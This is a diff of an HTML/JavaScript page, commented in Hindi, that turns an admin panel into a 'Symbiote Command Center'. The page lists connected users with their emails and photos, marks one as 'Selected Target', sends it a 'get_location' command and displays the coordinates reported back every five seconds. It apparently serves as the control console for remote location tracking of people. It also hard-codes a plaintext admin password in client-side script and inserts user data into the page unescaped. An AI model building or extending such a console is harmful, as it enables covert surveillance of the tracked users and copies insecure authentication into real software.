@@ -3,194 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard</title>
+    <title>Symbiote Command Center</title>
     
     <!-- सुंदर आइकॉन के लिए Font Awesome लाइब्रेरी -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     
     <style>
-        /* CSS का हिस्सा - नया और सुंदर डिज़ाइन */
+        /* CSS का हिस्सा - नया और एडवांस डिज़ाइन */
         :root {
-            --bg-dark: #1a1f2c;
-            --bg-light: #272e3d;
-            --primary-color: #007bff;
-            --text-light: #f0f2f5;
-            --text-secondary: #a9b3c1;
-            --border-color: #3a4152;
-            --success-color: #28a745;
-            --error-color: #dc3545;
+            --bg-dark: #1f2937;
+            --bg-light: #374151;
+            --primary-color: #3b82f6;
+            --primary-hover: #2563eb;
+            --text-light: #f9fafb;
+            --text-secondary: #d1d5db;
+            --border-color: #4b5563;
+            --success-color: #22c55e;
+            --error-color: #ef4444;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--bg-dark);
             color: var(--text-light);
             font-size: 16px;
+            overscroll-behavior: none;
         }
 
         /* --- लॉगिन स्क्रीन --- */
         #login-container {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background-color: var(--bg-dark);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7));
+            display: flex; justify-content: center; align-items: center;
+            z-index: 100; backdrop-filter: blur(5px);
         }
         .login-box {
-            background-color: var(--bg-light);
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            text-align: center;
-            border: 1px solid var(--border-color);
+            background-color: var(--bg-light); padding: 40px; border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center;
+            border: 1px solid var(--border-color); animation: fadeIn 0.5s ease;
         }
-        .login-box h2 {
-            margin-bottom: 20px;
-        }
+        .login-box h2 { margin-bottom: 20px; }
         .login-box input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            background-color: var(--bg-dark);
-            border: 1px solid var(--border-color);
-            border-radius: 5px;
-            color: var(--text-light);
-            font-size: 1em;
+            width: 100%; padding: 12px; margin-bottom: 20px; background-color: var(--bg-dark);
+            border: 1px solid var(--border-color); border-radius: 5px; color: var(--text-light); font-size: 1em;
         }
         .login-box button {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--primary-color);
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
+            width: 100%; padding: 12px; background-color: var(--primary-color); border: none;
+            border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold;
+            cursor: pointer; transition: background-color 0.2s;
         }
-        .login-box button:hover {
-            background-color: #0056b3;
-        }
-        #login-error {
-            color: var(--error-color);
-            margin-top: 15px;
-            display: none;
-        }
+        .login-box button:hover { background-color: var(--primary-hover); }
+        #login-error { color: var(--error-color); margin-top: 15px; display: none; }
 
-        /* --- मुख्य डैशबोर्ड --- */
+        /* --- मुख्य डैशबोर्ड लेआउट --- */
         .hidden { display: none !important; }
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 350px 1fr;
-            height: 100vh;
+        .dashboard-grid { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
+        .sidebar { background-color: var(--bg-light); padding: 20px; border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
+        .main-content { display: grid; grid-template-rows: auto 1fr; padding: 20px; gap: 20px; overflow-y: auto; }
+        .header { text-align: center; padding-bottom: 15px; border-bottom: 1px solid var(--border-color); margin-bottom: 15px; }
+        .header h1 { font-size: 1.5em; }
+        .card { background-color: var(--bg-light); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color); }
+        .card h3 { margin-bottom: 15px; color: var(--text-secondary); font-size: 1.1em; display: flex; align-items: center; }
+        .card h3 i { margin-right: 10px; }
+
+        /* --- यूज़र लिस्ट --- */
+        #user-list { flex-grow: 1; overflow-y: auto; }
+        .user-item {
+            display: flex; align-items: center; padding: 15px;
+            border-radius: 6px; cursor: pointer; transition: background-color 0.2s;
+            border: 1px solid transparent;
         }
-        .control-panel {
-            background-color: var(--bg-light);
-            padding: 20px;
-            border-right: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .data-feed {
-            padding: 20px;
-            overflow-y: auto;
-        }
-        header {
-            text-align: center;
-            padding-bottom: 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-        header h1 {
-            font-size: 1.5em;
-        }
-        .card {
-            background-color: var(--bg-dark);
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-        }
-        .card h3 {
-            margin-bottom: 15px;
-            color: var(--text-secondary);
-        }
-        .card i {
-            margin-right: 10px;
-        }
+        .user-item:hover { background-color: var(--border-color); }
+        .user-item.selected { background-color: var(--primary-color); border-color: var(--primary-hover); }
+        .user-item img { width: 40px; height: 40px; border-radius: 50%; margin-right: 15px; }
+        .user-info .name { font-weight: bold; }
+        .user-info .email { font-size: 0.8em; color: var(--text-secondary); }
+
+        /* --- कमांड्स और लॉग्स --- */
         .command-btn {
-            width: 100%;
-            padding: 15px;
-            font-size: 1em;
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-align: left;
-            transition: background-color 0.2s;
+            width: 100%; padding: 15px; font-size: 1em; background-color: var(--primary-color);
+            color: white; border: none; border-radius: 5px; cursor: pointer;
+            text-align: left; transition: all 0.2s; display: flex; align-items: center;
         }
-        .command-btn:hover {
-            background-color: #0069d9;
-        }
-        #status-log {
-            height: 200px;
-            overflow-y: auto;
-            font-size: 0.9em;
-            color: var(--text-secondary);
-        }
-        #status-log div {
-            padding: 5px 0;
-            border-bottom: 1px solid var(--border-color);
-        }
-        .data-feed h2 {
-            margin-bottom: 20px;
-        }
-        #data-display {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
+        .command-btn:hover { background-color: var(--primary-hover); }
+        .command-btn:disabled { background-color: var(--border-color); cursor: not-allowed; }
+        #status-log { height: 200px; overflow-y: auto; font-size: 0.9em; color: var(--text-secondary); }
+        #status-log div { padding: 5px 0; border-bottom: 1px solid var(--border-color); }
+
+        /* --- लाइव डेटा फीड --- */
+        #data-display { display: flex; flex-direction: column; gap: 15px; }
         .data-item {
-            background-color: var(--bg-light);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 15px;
-            animation: fadeIn 0.5s ease;
+            background-color: var(--bg-light); border: 1px solid var(--border-color); border-radius: 8px;
+            padding: 15px; animation: fadeIn 0.5s ease;
         }
-        .data-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-            color: var(--text-secondary);
-        }
-        .data-header .type {
-            font-weight: bold;
-            color: var(--text-light);
-            font-size: 1.1em;
-        }
-        .data-body {
-            font-family: 'Courier New', Courier, monospace;
-            word-wrap: break-word;
-            background-color: var(--bg-dark);
-            padding: 10px;
-            border-radius: 5px;
-        }
-        .data-item.error .data-header .type {
-            color: var(--error-color);
-        }
+        .data-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; color: var(--text-secondary); }
+        .data-header .type { font-weight: bold; color: var(--text-light); font-size: 1.1em; display: flex; align-items: center;}
+        .data-body { font-family: 'Courier New', Courier, monospace; word-wrap: break-word; background-color: var(--bg-dark); padding: 10px; border-radius: 5px; }
+        .data-item.error .data-header .type { color: var(--error-color); }
         
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* मोबाइल के लिए रेस्पॉन्सिव डिज़ाइन */
+        @media (max-width: 768px) {
+            .dashboard-grid { grid-template-columns: 1fr; }
+            .sidebar { height: 40vh; border-right: none; border-bottom: 1px solid var(--border-color); }
+        }
     </style>
 </head>
 <body>
@@ -198,100 +116,142 @@
     <!-- लॉगिन स्क्रीन -->
     <div id="login-container">
         <div class="login-box">
-            <h2><i class="fa-solid fa-lock"></i> Admin Panel</h2>
-            <input type="password" id="password-input" placeholder="Access Code">
-            <button id="login-button">Unlock</button>
-            <p id="login-error">Access Denied</p>
+            <h2><i class="fa-solid fa-shield-virus"></i> Symbiote Access</h2>
+            <input type="password" id="password-input" placeholder="Admin Passcode">
+            <button id="login-button">Authenticate</button>
+            <p id="login-error">Authentication Failed</p>
         </div>
     </div>
 
     <!-- मुख्य डैशबोर्ड -->
     <main id="dashboard" class="dashboard-grid hidden">
         
-        <!-- बायां पैनल: कमांड्स और लॉग -->
-        <aside class="control-panel">
+        <!-- बायां पैनल: यूज़र्स की लिस्ट -->
+        <aside class="sidebar">
             <header>
-                <h1><i class="fa-solid fa-terminal"></i> Symbiote Control</h1>
+                <h1><i class="fa-solid fa-users"></i> Connected Users</h1>
             </header>
-            
-            <div class="card">
-                <h3><i class="fa-solid fa-paper-plane"></i> Send Command</h3>
-                <button id="getLocationBtn" class="command-btn"><i class="fa-solid fa-location-crosshairs"></i> Get Location</button>
-            </div>
-            
-            <div class="card" style="flex-grow: 1;">
-                <h3><i class="fa-solid fa-shield-halved"></i> System Log</h3>
-                <div id="status-log"></div>
+            <div id="user-list">
+                <!-- यूज़र यहाँ जावास्क्रिप्ट से लोड होंगे -->
             </div>
         </aside>
         
-        <!-- दायां पैनल: प्राप्त डेटा -->
-        <section class="data-feed">
-            <h2><i class="fa-solid fa-database"></i> Live Data Feed</h2>
-            <div id="data-display"></div>
-        </section>
+        <!-- दायां पैनल: कमांड्स और लाइव डेटा -->
+        <div class="main-content">
+            <div class="card">
+                <h3><i class="fa-solid fa-bullseye"></i> Target & Commands</h3>
+                <div id="selected-user-details" style="margin-bottom: 15px;">No target selected.</div>
+                <button id="getLocationBtn" class="command-btn" disabled><i class="fa-solid fa-location-crosshairs" style="margin-right: 10px;"></i> Execute: Get Location</button>
+            </div>
+            
+            <div class="card" style="display: flex; flex-direction: column;">
+                <h3><i class="fa-solid fa-satellite-dish"></i> Live Data Feed</h3>
+                <div id="data-display" style="flex-grow: 1; overflow-y: auto;">
+                     <!-- डेटा यहाँ जावास्क्रिप्ट से लोड होगा -->
+                </div>
+            </div>
+        </div>
         
     </main>
 
 
     <script>
-        // जावास्क्रिप्ट का हिस्सा (लॉजिक वही, सिर्फ डेटा दिखाने का तरीका बदला है)
+        // एडमिन पैनल का जावास्क्रिप्ट - अब यह Firestore से बात करेगा
         
-        // !!! अपना गुप्त पासवर्ड यहाँ सेट करें !!!
-        const ADMIN_PASSWORD = "your_secret_password_123";
+        const ADMIN_PASSWORD = "himanshu@123";
 
+        // DOM Elements
         const loginContainer = document.getElementById('login-container');
         const passwordInput = document.getElementById('password-input');
         const loginButton = document.getElementById('login-button');
         const loginError = document.getElementById('login-error');
         const dashboard = document.getElementById('dashboard');
+        const userListDiv = document.getElementById('user-list');
         const getLocationBtn = document.getElementById('getLocationBtn');
-        const statusLog = document.getElementById('status-log');
         const dataDisplay = document.getElementById('data-display');
-        
+        const selectedUserDetailsDiv = document.getElementById('selected-user-details');
+
+        // App State
+        let selectedUserId = null;
         let displayedDataCount = 0;
 
+        // --- लॉगिन ---
         loginButton.addEventListener('click', handleLogin);
         passwordInput.addEventListener('keyup', (event) => {
             if (event.key === 'Enter') handleLogin();
         });
-
         function handleLogin() {
             if (passwordInput.value === ADMIN_PASSWORD) {
                 loginContainer.classList.add('hidden');
                 dashboard.classList.remove('hidden');
-                logStatus('Access granted. System online.', 'success');
+                fetchUsers();
                 startFetchingData();
             } else {
                 loginError.style.display = 'block';
             }
         }
         
-        getLocationBtn.addEventListener('click', () => {
-            sendCommand({ command: 'get_location' });
-        });
-        
-        async function sendCommand(commandObject) {
-            logStatus(`Sending command: ${commandObject.command}...`);
+        // --- मुख्य फंक्शन्स ---
+        async function fetchUsers() {
             try {
-                const response = await fetch('/send-command', {
+                const response = await fetch('/get-users');
+                const users = await response.json();
+                userListDiv.innerHTML = ''; // पुरानी लिस्ट को साफ़ करें
+                users.forEach(user => {
+                    const userDiv = document.createElement('div');
+                    userDiv.className = 'user-item';
+                    userDiv.dataset.userId = user.uid;
+                    userDiv.innerHTML = `
+                        <img src="${user.photoURL}" alt="DP">
+                        <div class="user-info">
+                            <div class="name">${user.displayName}</div>
+                            <div class="email">${user.email}</div>
+                        </div>
+                    `;
+                    userDiv.addEventListener('click', () => selectUser(user));
+                    userListDiv.appendChild(userDiv);
+                });
+            } catch (error) {
+                console.error('Failed to fetch users:', error);
+            }
+        }
+        
+        function selectUser(user) {
+            selectedUserId = user.uid;
+            
+            // पुराने सलेक्शन को हटाएं
+            document.querySelectorAll('.user-item').forEach(item => item.classList.remove('selected'));
+            // नए को हाईलाइट करें
+            document.querySelector(`[data-user-id="${user.uid}"]`).classList.add('selected');
+            
+            selectedUserDetailsDiv.innerHTML = `<b>Selected Target:</b> ${user.displayName}`;
+            getLocationBtn.disabled = false; // अब कमांड बटन को इनेबल करें
+        }
+
+        async function sendCommand(commandObject) {
+            if (!selectedUserId) {
+                alert('Please select a user first!');
+                return;
+            }
+            getLocationBtn.disabled = true; // दोबारा क्लिक होने से रोकें
+            try {
+                await fetch('/send-command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(commandObject)
+                    body: JSON.stringify({
+                        userId: selectedUserId,
+                        command: commandObject
+                    })
                 });
-                const result = await response.json();
-                if (response.ok) {
-                    logStatus('Command sent successfully.', 'success');
-                } else {
-                    logStatus(`Error: ${result.message}`, 'error');
-                }
             } catch (error) {
-                logStatus('Network error. Failed to send command.', 'error');
+                console.error('Send command error:', error);
+            } finally {
+                getLocationBtn.disabled = false; // कमांड के बाद फिर से इनेबल करें
             }
         }
 
         function startFetchingData() {
-            setInterval(fetchData, 5000); // हर 5 सेकंड में
+            setInterval(fetchData, 5000);
             fetchData();
         }
 
@@ -299,53 +259,43 @@
             try {
                 const response = await fetch('/get-reported-data');
                 const data = await response.json();
-                
                 if (data.length > displayedDataCount) {
                     const newData = data.slice(displayedDataCount);
                     displayData(newData);
                     displayedDataCount = data.length;
                 }
             } catch (error) {
-                logStatus('Error fetching data from server.', 'error');
+                console.error('Fetch data error:', error);
             }
         }
-
-        // डेटा दिखाने का नया और बेहतर तरीका
+        
         function displayData(newDataArray) {
             newDataArray.forEach(item => {
                 const itemCard = document.createElement('div');
                 itemCard.className = `data-item ${item.type === 'error' ? 'error' : ''}`;
-
                 let iconClass = 'fa-solid fa-question';
                 if (item.type === 'location') iconClass = 'fa-solid fa-location-dot';
                 if (item.type === 'error') iconClass = 'fa-solid fa-triangle-exclamation';
 
-                let bodyContent = '';
-                if (item.type === 'location') {
-                    bodyContent = `Latitude: ${item.latitude}<br>Longitude: ${item.longitude}<br>Accuracy: ${item.accuracy} meters`;
-                } else {
-                    bodyContent = item.message || JSON.stringify(item, null, 2);
-                }
+                let bodyContent = (item.type === 'location')
+                    ? `Latitude: ${item.latitude}<br>Longitude: ${item.longitude}<br>Accuracy: ${item.accuracy}m`
+                    : item.message || JSON.stringify(item, null, 2);
 
                 itemCard.innerHTML = `
                     <div class="data-header">
-                        <span class="type"><i class="${iconClass}"></i> ${item.type.toUpperCase()}</span>
-                        <span class="timestamp"><i class="fa-regular fa-clock"></i> ${new Date(item.timestamp).toLocaleString()}</span>
+                        <span class="type"><i class="${iconClass}" style="margin-right: 10px;"></i> ${item.type.toUpperCase()}</span>
+                        <span class="timestamp"><i class="fa-regular fa-clock" style="margin-right: 5px;"></i> ${new Date(item.timestamp).toLocaleString()}</span>
                     </div>
                     <div class="data-body">${bodyContent}</div>
                 `;
                 dataDisplay.prepend(itemCard);
             });
         }
-        
-        function logStatus(message, type = 'info') {
-            const time = new Date().toLocaleTimeString();
-            const logEntry = document.createElement('div');
-            let color = type === 'success' ? 'var(--success-color)' : type === 'error' ? 'var(--error-color)' : 'inherit';
-            logEntry.innerHTML = `<span style="color:${color}">[${time}] ${message}</span>`;
-            statusLog.prepend(logEntry);
-        }
 
+        // --- इवेंट लिस्टनर्स ---
+        getLocationBtn.addEventListener('click', () => {
+            sendCommand({ command: 'get_location' });
+        });
     </script>
 </body>
 </html>
